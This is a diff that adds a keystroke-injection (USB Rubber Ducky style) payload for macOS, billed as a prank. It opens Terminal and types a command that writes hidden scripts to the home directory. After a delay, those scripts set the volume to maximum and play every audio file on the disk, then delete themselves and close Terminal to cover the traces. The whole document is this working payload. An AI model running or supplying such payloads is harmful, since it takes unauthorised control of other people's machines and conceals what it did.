@@ -1,0 +1,15 @@
+REM Plays all the audio files on a Mac - Loads of fun
+
+DELAY 2000
+
+GUI SPACE
+
+DELAY 500
+
+STRING Terminal
+ENTER
+
+DELAY 1000
+
+STRING printf '#!/bin/bash\nosascript -e "set volume 100 without output muted"\nafplay $* &' > ~/afpla; chmod +x ~/afpla; printf '#!/bin/bash\nsleep 120\nfind / \( -name "*.mp3" -o -name "*.m4a" -o -name "*.aif*" -o -name "*.wav" \) -exec ~/afpla {} \;; rm -f ~/afpla ~/afpl;' > ~/afpl; chmod +x ~/afpl; nohup ~/afpl &> /dev/null & killall Terminal
+ENTER
